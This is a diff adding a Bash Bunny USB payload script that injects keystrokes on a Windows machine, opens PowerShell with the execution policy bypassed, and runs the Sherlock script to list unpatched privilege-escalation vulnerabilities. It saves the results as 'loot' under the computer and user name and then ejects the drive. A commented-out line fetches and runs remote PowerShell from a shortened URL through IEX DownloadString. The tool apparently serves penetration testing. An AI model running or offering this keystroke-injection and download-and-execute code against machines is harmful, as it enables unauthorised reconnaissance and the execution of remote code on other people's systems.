@@ -1,0 +1,90 @@
+#!/bin/bash
+#
+# Title:         PrivEscChecker
+# Author:        illwill
+# Version:       0.1
+#
+# Check Windows box for unpatched vulns that allow privilege escalation
+# then stashes them in /root/udisk/loot/PrivEscChecker/%ComputerName%-%username%
+# Can be used locally or webdls the script from github
+# Credits to rasta-mouse for their powershell script:
+# https://github.com/rasta-mouse/Sherlock Sherlock.ps1
+#
+# Blue...............Running Script
+# Purple.............Checking Results
+# Green..............Found Possible Privilege Escalation
+# Red................No Possible Privilege Escalation
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R 200
+LOOTDIR=/root/udisk/loot/PrivEscChecker
+mkdir -p $LOOTDIR
+#cleanup any prior unfinished payloads
+rm $LOOTDIR/DONE
+rm $LOOTDIR/OUTPUT
+
+ATTACKMODE HID STORAGE
+LED B 200
+
+# wait 6 seconds for the storage to popup, then open powershell and get bunny drive letter
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 500
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+
+########################################################################################################################
+# Check for missing Windows update patches either by downloading or use local file (comment local and uncomment webdl) #
+########################################################################################################################
+
+# LOCAL FROM BUNNY
+Q STRING PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"\& \{Import-Module -Name \$Bunny\\payloads\\${SWITCH_POSITION}\\Sherlock.ps1\; Find-AllVulns \| Out-File \$Bunny\\loot\\PrivEscChecker\\OUTPUT.txt\}\"
+
+# WEBDL FROM INTERNET
+# Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nS1L45\'\)\; Find-AllVulns \| Out-File \$Bunny\\loot\\PrivEscChecker\\OUTPUT.txt
+
+Q ENTER
+Q DELAY 100
+
+# Create a file called DONE with %ComputerName%-%username%
+Q STRING New-Item \$Bunny\\loot\\PrivEscChecker\\DONE -type file -force -value \$env:computername-\$env:username
+Q ENTER
+Q DELAY 100
+
+# Eject the USB Safely 
+Q STRING \$Eject \=  New-Object -comObject Shell.Application
+Q ENTER
+Q DELAY 100
+Q STRING \$Eject.NameSpace\(17\).ParseName\(\$Bunny\).InvokeVerb\(\"Eject\"\)
+Q ENTER
+Q STRING exit
+Q ENTER
+
+sync
+#remount the drive and check results
+LED R B 200
+sleep 1
+# Wait for the DONE file to be created so we know powershell is finished
+LOOTDIR=/root/udisk/loot/PrivEscChecker
+DONEFILE=$LOOTDIR/DONE
+while [ ! -e $DONEFILE ]; do sleep .5; done;
+sleep 1
+
+# cat %ComputerName%-%username% from DONE as a variable to name folder and then delete
+DIR=`cat $DONEFILE`
+mkdir $LOOTDIR/$DIR
+mv $LOOTDIR/OUTPUT.txt $LOOTDIR/$DIR/OUTPUT.txt
+rm -f $DONEFILE
+
+# Check OUTPUT.txt for any missing patches
+if grep -lq 'Appears Vulnerable' $LOOTDIR/$DIR/OUTPUT.txt; then
+  LED G 200
+else 
+  LED R
+fi
